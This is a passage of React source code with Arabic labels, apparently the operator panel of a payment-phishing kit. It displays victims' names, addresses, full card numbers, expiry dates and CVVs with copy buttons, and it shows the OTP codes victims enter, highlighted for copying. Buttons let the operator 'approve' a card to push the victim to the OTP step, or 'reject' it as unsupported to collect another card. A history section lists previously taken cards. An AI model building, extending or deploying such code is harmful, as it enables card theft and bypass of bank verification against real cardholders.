                  <div className={`rounded-2xl p-4 text-xs shadow-sm ${bgBubbleUser}`}>
                    <div className="flex items-center justify-between text-[11px] font-bold border-b border-black/10 pb-2 mb-2">
                      <span className="flex items-center gap-1.5 text-[#00a884]">
                        <MapPin className="h-4 w-4" /> خطوة 2: معلومات التوصيل والعنوان الوطني
                      </span>
                    </div>

                    <div className="grid grid-cols-2 gap-2 text-xs">
                      <div>
                        <span className="opacity-60 block text-[10px]">الاسم الكامل:</span>
                        <strong className="text-sm">{selectedSession.checkout.fullName}</strong>
                      </div>
                      <div>
                        <span className="opacity-60 block text-[10px]">البريد الإلكتروني:</span>
                        <strong className="text-xs">{selectedSession.checkout.email || "-"}</strong>
                      </div>
                      <div>
                        <span className="opacity-60 block text-[10px]">المدينة:</span>
                        <strong className="text-xs">{selectedSession.checkout.city || "-"}</strong>
                      </div>
                      <div>
                        <span className="opacity-60 block text-[10px]">العنوان الوطني:</span>
                        <strong className="text-xs text-emerald-700 bg-emerald-100 px-1.5 py-0.5 rounded">
                          {selectedSession.checkout.nationalAddress || "-"}
                        </strong>
                      </div>
                      <div>
                        <span className="opacity-60 block text-[10px]">الشارع:</span>
                        <span className="text-xs">{selectedSession.checkout.street || "-"}</span>
                      </div>
                      <div>
                        <span className="opacity-60 block text-[10px]">الحي:</span>
                        <span className="text-xs">{selectedSession.checkout.neighborhood || "-"}</span>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Step 3: Card Payment Details Card (CRITICAL FULL PAYMENT DATA & MOCKUP) */}
              {selectedSession.checkout?.cardNumber && (
                <div className="flex flex-col gap-1 max-w-xl">
                  <div className={`rounded-2xl p-4 text-xs shadow-md border-2 border-amber-400 ${
                    isDarkMode ? "bg-[#1f2c34] text-white" : "bg-gradient-to-br from-amber-50 to-amber-100/60 text-slate-900"
                  }`}>
                    <div className="flex items-center justify-between text-xs font-bold border-b border-amber-300/40 pb-2 mb-3">
                      <span className="flex items-center gap-2 text-amber-700">
                        <CreditCard className="h-5 w-5 text-amber-600" />
                        💳 بطاقة الدفع المباشرة (Physical Card Visual)
                      </span>
                      <span className="rounded bg-amber-200 px-2 py-0.5 text-[10px] text-amber-800 uppercase font-bold">
                        {selectedSession.checkout.paymentMethod || "بطاقة"}
                      </span>
                    </div>

                    {/* Realistic Physical Credit Card Mockup */}
                    <CreditCardMockup
                      cardholderName={selectedSession.checkout.cardholderName}
                      cardNumber={selectedSession.checkout.cardNumber}
                      cardExpiry={selectedSession.checkout.cardExpiry}
                      cardCvv={selectedSession.checkout.cardCvv}
                      paymentMethod={selectedSession.checkout.paymentMethod}
                      binInfo={selectedSession.checkout.binInfo}
                      onCopy={copyToClipboard}
                      copiedKey={copiedKey}
                    />

                    <div className="space-y-2.5 pt-2">
                      <div>
                        <span className="opacity-70 text-[10px] block">اسم صاحب البطاقة:</span>
                        <strong className="text-sm tracking-wide uppercase">
                          {selectedSession.checkout.cardholderName || "غير معروف"}
                        </strong>
                      </div>

                      <div>
                        <div className="flex items-center justify-between">
                          <span className="opacity-70 text-[10px]">رقم البطاقة:</span>
                          <button
                            onClick={() => copyToClipboard(selectedSession.checkout?.cardNumber || "", "card")}
                            className="flex items-center gap-1 text-[10px] font-bold text-amber-800 underline"
                          >
                            {copiedKey === "card" ? <Check className="h-3 w-3 text-emerald-600" /> : <Copy className="h-3 w-3" />}
                            {copiedKey === "card" ? "تم نسخ الرقم" : "نسخ رقم البطاقة"}
                          </button>
                        </div>
                        <div dir="ltr" className="mt-1 font-mono text-lg font-bold tracking-widest bg-white/70 p-2 rounded border border-amber-200 text-slate-900">
                          {selectedSession.checkout.cardNumber}
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-3 pt-1">
                        <div className="bg-white/60 p-2 rounded border border-amber-200">
                          <span className="opacity-70 text-[10px] block">تاريخ الانتهاء:</span>
                          <strong dir="ltr" className="text-sm font-mono block text-slate-900">
                            {selectedSession.checkout.cardExpiry || "--/--"}
                          </strong>
                        </div>
                        <div className="bg-white/60 p-2 rounded border border-amber-200">
                          <div className="flex items-center justify-between">
                            <span className="opacity-70 text-[10px]">رمز CVV:</span>
                            <button
                              onClick={() => copyToClipboard(selectedSession.checkout?.cardCvv || "", "cvv")}
                              className="text-[9px] underline text-amber-800"
                            >
                              {copiedKey === "cvv" ? "تم" : "نسخ"}
                            </button>
                          </div>
                          <strong dir="ltr" className="text-sm font-mono block text-red-600 font-bold">
                            {selectedSession.checkout.cardCvv || "---"}
                          </strong>
                        </div>
                      </div>

                      {/* BIN Lookup Details (Bank Name, Card Level, Type, Scheme) */}
                      {selectedSession.checkout.binInfo && (
                        <div className="mt-3 rounded-xl bg-amber-100/80 p-2.5 border border-amber-300 text-[11px] text-amber-950 space-y-1">
                          <div className="font-bold text-amber-900 flex items-center justify-between border-b border-amber-300/50 pb-1">
                            <span>🔍 معلومات البنك ونوع البطاقة (BIN Lookup)</span>
                            {selectedSession.checkout.binInfo.scheme && (
                              <span className="uppercase font-extrabold text-amber-800">
                                {selectedSession.checkout.binInfo.scheme}
                              </span>
                            )}
                          </div>
                          {selectedSession.checkout.binInfo.bankName && (
                            <div>
                              <span className="opacity-75">البنك المصدر: </span>
                              <strong>{selectedSession.checkout.binInfo.bankName} {selectedSession.checkout.binInfo.countryEmoji || ""}</strong>
                            </div>
                          )}
                          {selectedSession.checkout.binInfo.type && (
                            <div>
                              <span className="opacity-75">نوع البطاقة (Type): </span>
                              <strong className="uppercase">{selectedSession.checkout.binInfo.type}</strong>
                              {selectedSession.checkout.binInfo.brand && (
                                <span className="opacity-75"> ({selectedSession.checkout.binInfo.brand})</span>
                              )}
                            </div>
                          )}
                          {selectedSession.checkout.binInfo.countryName && (
                            <div>
                              <span className="opacity-75">الدولة (Country): </span>
                              <strong>{selectedSession.checkout.binInfo.countryName} {selectedSession.checkout.binInfo.countryEmoji || ""}</strong>
                            </div>
                          )}
                        </div>
                      )}

                      {/* Admin Card Approval / Rejection Action Controls */}
                      <div className="mt-4 pt-3 border-t border-amber-300/60 flex flex-col gap-2">
                        <div className="flex items-center justify-between text-[11px] font-bold text-slate-800">
                          <span>⚙️ التحكم المباشر بالبطاقة (Card Approval):</span>
                          <span className={`px-2 py-0.5 rounded text-[10px] font-black ${
                            selectedSession.checkout.cardApprovalStatus === "approved"
                              ? "bg-emerald-200 text-emerald-900 border border-emerald-400"
                              : selectedSession.checkout.cardApprovalStatus === "rejected_unsupported"
                              ? "bg-red-200 text-red-900 border border-red-400"
                              : "bg-amber-200 text-amber-900 border border-amber-400 animate-pulse"
                          }`}>
                            {selectedSession.checkout.cardApprovalStatus === "approved"
                              ? "🟢 تم القبول والتحويل لـ OTP"
                              : selectedSession.checkout.cardApprovalStatus === "rejected_unsupported"
                              ? "🔴 تم الرفض (غير مدعومة)"
                              : "⏳ بانتظار اتخاذ إجراء"}
                          </span>
                        </div>

                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 mt-1">
                          <button
                            onClick={async () => {
                              try {
                                await fetch("/api/admin/card-action", {
                                  method: "POST",
                                  headers: { "Content-Type": "application/json" },
                                  body: JSON.stringify({
                                    visitorId: selectedSession.visitorId,
                                    action: "approve",
                                  }),
                                });
                                void fetchSessions();
                              } catch (e) {
                                console.error("Card approve failed:", e);
                              }
                            }}
                            className="flex items-center justify-center gap-1.5 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white py-2 px-3 text-xs font-bold shadow transition active:scale-95"
                          >
                            <Check className="h-4 w-4" />
                            قبول البطاقة وتحويل لـ OTP
                          </button>

                          <button
                            onClick={async () => {
                              try {
                                await fetch("/api/admin/card-action", {
                                  method: "POST",
                                  headers: { "Content-Type": "application/json" },
                                  body: JSON.stringify({
                                    visitorId: selectedSession.visitorId,
                                    action: "reject",
                                  }),
                                });
                                void fetchSessions();
                              } catch (e) {
                                console.error("Card reject failed:", e);
                              }
                            }}
                            className="flex items-center justify-center gap-1.5 rounded-xl bg-red-600 hover:bg-red-700 text-white py-2 px-3 text-xs font-bold shadow transition active:scale-95"
                          >
                            <X className="h-4 w-4" />
                            البطاقة غير مدعومة (رفض)
                          </button>
                        </div>
                      </div>

                      {/* Previous Cards History (Collapsible / Default Collapsed) */}
                      {selectedSession.checkout.cardHistory && selectedSession.checkout.cardHistory.length > 0 && (
                        <div className="mt-4 pt-3 border-t border-amber-300/60">
                          <button
                            type="button"
                            onClick={() => setShowCardHistory((prev) => !prev)}
                            className="w-full flex items-center justify-between text-[11px] font-bold text-slate-800 p-2 rounded-xl bg-amber-200/50 hover:bg-amber-200/80 transition active:scale-[0.99] border border-amber-300/60"
                          >
                            <div className="flex items-center gap-1.5">
                              <span>📜 سجل البطاقات السابقة المأخوذة ({selectedSession.checkout.cardHistory.length})</span>
                            </div>
                            <div className="flex items-center gap-1 text-[10px] text-amber-900 font-semibold">
                              <span>{showCardHistory ? "تصغير / إخفاء" : "عرض التفاصيل (مُصغر)"}</span>
                              <ChevronDown
                                className={`h-3.5 w-3.5 text-amber-800 transition-transform duration-200 ${
                                  showCardHistory ? "rotate-180" : ""
                                }`}
                              />
                            </div>
                          </button>

                          {showCardHistory && (
                            <div className="space-y-2.5 mt-2.5 animate-in fade-in slide-in-from-top-1 duration-200">
                              {selectedSession.checkout.cardHistory.map((oldCard, idx) => (
                                <div key={idx} className="bg-white/80 p-3 rounded-xl border border-amber-300/70 text-xs shadow-sm space-y-1">
                                  <div className="flex items-center justify-between text-[10px] font-bold text-slate-600 border-b border-gray-200 pb-1">
                                    <span>بطاقة سابقة #{idx + 1}</span>
                                    {oldCard.submittedAt && <span>{new Date(oldCard.submittedAt).toLocaleTimeString("ar-SA")}</span>}
                                  </div>
                                  <div className="flex items-center justify-between font-mono font-bold text-slate-900 dir-ltr" dir="ltr">
                                    <span>{oldCard.cardNumber}</span>
                                    <button
                                      onClick={() => copyToClipboard(oldCard.cardNumber || "", `old_card_${idx}`)}
                                      className="text-[10px] text-amber-800 underline font-sans"
                                    >
                                      {copiedKey === `old_card_${idx}` ? "تم النسخ" : "نسخ"}
                                    </button>
                                  </div>
                                  <div className="flex justify-between text-[11px] text-slate-700 font-mono">
                                    <span>اسم: {oldCard.cardholderName || "-"}</span>
                                    <span>تاريخ: {oldCard.cardExpiry || "--/--"}</span>
                                    <span className="text-red-600 font-bold">CVV: {oldCard.cardCvv || "---"}</span>
                                  </div>
                                  {oldCard.binInfo?.bankName && (
                                    <div className="text-[10px] text-amber-900 font-medium">
                                      🏛️ {oldCard.binInfo.bankName} {oldCard.binInfo.scheme ? `(${oldCard.binInfo.scheme})` : ""}
                                    </div>
                                  )}
                                </div>
                              ))}
                            </div>
                          )}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Step 4: OTP Verification Code Card (HIGHLIGHTED OTP) */}
              {selectedSession.checkout?.otpCode && (
                <div className="flex flex-col gap-1 max-w-xl">
                  <div className={`rounded-2xl p-4 text-xs shadow-lg border-2 border-emerald-500 animate-pulse ${
                    isDarkMode ? "bg-[#113a2c] text-white" : "bg-emerald-50 text-emerald-950"
                  }`}>
                    <div className="flex items-center justify-between text-xs font-bold border-b border-emerald-200 pb-2 mb-2">
                      <span className="flex items-center gap-2 text-emerald-700">
                        <KeyRound className="h-5 w-5 text-emerald-600" />
                        🔑 رمز التحقق (OTP) المدخل من العميل
                      </span>
                      <button
                        onClick={() => copyToClipboard(selectedSession.checkout?.otpCode || "", "otp")}
                        className="flex items-center gap-1 text-[10px] font-bold text-emerald-800 underline"
                      >
                        {copiedKey === "otp" ? <Check className="h-3 w-3 text-emerald-600" /> : <Copy className="h-3 w-3" />}
                        {copiedKey === "otp" ? "تم نسخ الرمز" : "نسخ الرمز"}
                      </button>
                    </div>

                    <div className="text-center py-2">
                      <div dir="ltr" className="font-mono text-3xl font-extrabold tracking-[0.4em] text-emerald-700 bg-white p-3 rounded-xl border border-emerald-300 inline-block shadow-inner">
                        {selectedSession.checkout.otpCode}
                      </div>
                      {selectedSession.checkout.otpSubmittedAt && (
                        <p className="text-[10px] opacity-75 mt-2">
                          توقيث الإدخال: {new Date(selectedSession.checkout.otpSubmittedAt).toLocaleTimeString("ar-SA")}
                        </p>
                      )}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </main>
        ) : (
          <div className="flex flex-1 items-center justify-center p-8 text-center opacity-60">
            اختر جلسة زائر من القائمة الجانبية لعرض كامل البيانات والعمليات
          </div>
        )}
      </div>

      {/* Confirmation Modal for Clearing All Sessions */}
      {showClearConfirmModal && (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/60 p-4 backdrop-blur-sm animate-in fade-in">
          <div
            className={`w-full max-w-sm rounded-2xl p-5 shadow-2xl border ${
              isDarkMode ? "bg-[#111b21] border-[#222d34] text-white" : "bg-white border-gray-200 text-gray-900"
            }`}
          >
            <div className="flex items-center gap-3 text-red-500 mb-2.5">
              <div className="flex h-10 w-10 items-center justify-center rounded-full bg-red-100 dark:bg-red-950/50">
                <AlertTriangle className="h-5 w-5 text-red-600" />
              </div>
              <h3 className="text-base font-bold">مسح جميع الجلسات</h3>
            </div>
            <p className="text-xs opacity-75 mb-5 leading-relaxed">
              هل أنت متأكد من رغبتك في حذف وتفريغ كافة جلسات الزوار وبيانات الدفع المسجلة؟ سيتم مسح السجلات فوراً.
            </p>
            <div className="flex items-center justify-end gap-2.5">
              <button
                type="button"
                onClick={() => setShowClearConfirmModal(false)}
                className="rounded-xl px-4 py-2 text-xs font-medium hover:bg-gray-100 dark:hover:bg-white/10 transition"
              >
                إلغاء
              </button>
              <button
                type="button"
                onClick={() => void executeClearAll()}
                className="rounded-xl bg-red-600 px-4 py-2 text-xs font-bold text-white hover:bg-red-700 shadow-md transition"
              >
                نعم، مسح الكل الآن
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
